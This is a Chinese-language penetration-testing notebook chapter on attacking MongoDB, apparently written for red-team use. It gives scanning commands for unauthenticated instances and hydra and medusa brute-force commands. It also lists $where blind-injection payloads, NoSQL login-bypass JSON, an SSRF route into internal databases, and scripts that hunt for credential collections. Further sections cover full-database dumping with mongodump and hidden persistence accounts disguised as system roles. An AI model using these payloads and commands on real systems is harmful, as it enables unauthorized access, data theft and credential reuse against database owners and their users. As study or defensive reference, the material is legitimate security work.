# 07-MongoDB渗透

> MongoDB 的历史包袱：长期默认无认证 + 默认监听全网卡。即使新版开启认证，仍有注入与 SSRF 组合面。前置见 [[01-数据库渗透流程与探测|01章]]。

## 目录
- [[#一、未授权访问检测|一、未授权访问检测]]
- [[#二、默认无认证历史与bindIp问题|二、默认无认证历史与bindIp问题]]
- [[#三、开启认证后的绕过面|三、开启认证后的绕过面]]
- [[#四、$where JS注入执行|四、$where JS注入执行]]
- [[#五、SSRF配合MongoDB|五、SSRF配合MongoDB]]
- [[#六、NoSQL注入提一嘴|六、NoSQL注入提一嘴]]
- [[#七、信息收集命令集|七、信息收集命令集]]

---

## 一、未授权访问检测

```bash
# mongosh 直连（老客户端为 mongo）
mongosh --host <target> --port 27017

# 无需密码直接列出数据库 = 未授权访问命中
test> show dbs
admin   132.00 KiB
config   60.00 KiB
appdata  2.10 GiB

# nmap 批量探测
nmap -p 27017 --script mongodb-info <target>

# curl 探测（HTTP 接口，部分版本开放在 28017）
curl http://<target>:27017/
```

---

## 二、默认无认证历史与bindIp问题

| 版本区间 | 默认行为 |
|---------|---------|
| < 3.6 | **不开启认证**，`bind_ip` 默认 127.0.0.1 但运维常改为 0.0.0.0 |
| >= 3.6 | 默认 `bindIp: 127.0.0.1`，但 docker 镜像与云模板普遍覆盖该配置 |

典型暴露链：`docker run -d mongo` 未加 `--auth` → 宿主机 `-p 27017:27017` 映射 → 公网直连全库可读。检测与利用顺序见第一节；拿到数据后优先翻用户表、配置文件中的其他服务凭据（配合 [[08-口令破解与哈希提取|08章]] 做口令复用）。

配置文件层面的自查视角（红队报告引用）：

```yaml
# /etc/mongod.conf 危险配置组合
net:
  bindIp: 0.0.0.0        # 对全网监听
security:
  authorization: disabled # 无认证（或整段缺失，老版本即此行为）
```

---

## 三、开启认证后的绕过面

认证开启后并非高枕无忧，红队仍可尝试：

| 面 | 说明 |
|----|------|
| CVE-2021-20328 | 驱动层证书主机名校验缺陷（特定 Go/Java 驱动版本），中间人场景下可绕过 TLS 身份验证 |
| 弱口令 | admin 库 root 角色账户常配简单密码，hydra 模块 mongodb |
| 本地信任 | `localhost exception`：首次部署未建管理员时，本机连接可临时创建用户（拿到 webshell 后可用） |
| 副本集未认证 | 集群成员间内部认证缺失时，可伪装节点加入副本集同步全量数据 |

```bash
# hydra 爆破 MongoDB
hydra -L users.txt -P pass.txt -s 27017 <target> mongodb

# medusa（模块 mongodb）
medusa -h <target> -u admin -P pass.txt -M mongodb

# 命中后验证角色权限
mongosh "mongodb://admin:pass@<target>:27017/admin" --eval 'db.getUser("admin")'
```

---

## 四、$where JS注入执行

`$where` 操作符接受 JavaScript 表达式并在 mongod 进程内执行。**注意：现代版本沙箱化严重，不能直接 system() 调系统命令**，主要用于盲注提取数据：

```javascript
// 登录接口的查询参数被拼进 $where 时（服务端形如 { $where: "this.user=='"+u+"'" }）
// 经典盲注 payload：
' || this.password[0]=='a' || '        // 逐字符猜解
' || (this.password.match(/^a/)) && sleep(5000) || '   // 时间盲注变体
```

```javascript
// 服务端 mongosh 内验证 $where 行为
db.users.find({ $where: function() { return this.user == 'admin'; } });
// 注入后等价于把比较逻辑交给攻击者控制
```

> MongoDB 官方已多次收紧 server-side JS：4.x 后 `$where` 仅支持受限表达式且禁用大部分全局对象。实战价值在于**数据外带**而非 RCE；RCE 需另寻 SSRF/横向路径。

---

## 五、SSRF配合MongoDB

Web 应用存在 SSRF 且目标网络内有 MongoDB 时，可通过 SSRF 与内网库通信（CLOUD 类漏洞思路简化版）：

```bash
# MongoDB 有线协议是类 HTTP 的 BSON 报文，早期可直接构造 OP_QUERY 包经 SSRF 发送
# 利用点：SSRF 打内网 27017 → 枚举库 → 拖取敏感集合
```

典型流程：

1. SSRF 点确认可达内网：`http://target/fetch?url=http://10.0.0.5:27017`
2. 构造最小 BSON 探测包（isMaster 命令）验证协议交互。
3. 若应用使用 Mongo 驱动转发用户可控参数，可借 `$lookup`/聚合实现跨集合读取。

> 复杂协议交互建议直接用 gopher 协议封装完整报文（若 SSRF 支持非 http scheme）。此手法同样适用于 Redis 未授权（参见 [[06-Redis渗透|06章]]）的内网组合打击。

---

## 六、NoSQL注入提一嘴

登录框等 JSON 接口的经典绕过——`$gt` 空对象匹配任意值：

```json
POST /login
{"user": {"$gt": ""}, "pass": {"$gt": ""}}
// 等价 WHERE user != null AND pass != null → 返回首个用户即登录成功
{"user": "admin", "pass": {"$ne": ""}}    // $ne 不等于空 同理
{"user": "admin", "pass": {"$regex": "^a"}}  // 正则逐字符猜解密码
```

完整 NoSQL 注入手法体系（含 PHP 数组传参、正则盲注脚本）指向 [[../ctf_trea/Web/SQL/SQL总目录|CTF SQL注入专题]] 与 [[../archstrike-web教学/04-SQL注入攻击|SQL注入实战]] 的迁移练习。

---

## 七、信息收集命令集

未授权或拿到凭据后的标准动作：

```javascript
// 数据库与集合枚举
show dbs
use appdata
show collections

// 用户与角色（admin 库）
use admin
show users
db.system.users.find().pretty()
db.system.version.find()

// 当前连接与配置信息
db.serverStatus()
db.serverBuildInfo()          // 版本与编译信息
db.hostInfo()                 // 主机 OS 信息
db.getMongo().getDBs()

// 敏感数据快速定位（找凭据/密钥）
db.getCollectionNames().forEach(function(c) {
    if (/user|conf|token|secret/i.test(c)) print(db.getName() + '.' + c);
});
```

拿到凭据后回到 [[08-口令破解与哈希提取|08章]] 做 SCRAM 哈希提取与其他服务的口令复用。

---

## 八、数据导出与凭据翻找

未授权命中的核心价值是数据与内网凭据：

```bash
# mongodump 整库导出（命中未授权时）
mongodump --host <target> --port 27017 -o ./dump/

# 单库单集合快速导出 JSON
mongoexport --host <target> --db appdata --collection users --out users.json

# 带认证场景
mongodump --host <target> -u admin -p 'pass' --authenticationDatabase admin -o ./dump/
```

高价值翻找位置：

| 位置 | 内容 |
|------|------|
| `config` 库 | 分片/副本集拓扑，暴露内网其他节点 |
| 用户集合中的 `password` 字段 | 常见明文或弱哈希，直接复测其他服务 |
| 含 `smtp`/`oss`/`api` 字样的文档 | 第三方服务密钥 |
| `local` 库 oplog | 历史操作，可能含已删除的敏感记录 |

---

## 九、权限维持提一嘴

拿到主机权限后的 MongoDB 持久化思路：在 `admin` 库创建低可见性的自定义角色账户（角色名模仿系统组件），或在配置中追加 `net.port` 别名实例。属于后渗透阶段动作，优先级低于直接利用，了解即可。

---
**返回** [[数据库安全总目录|数据库安全 总目录]]
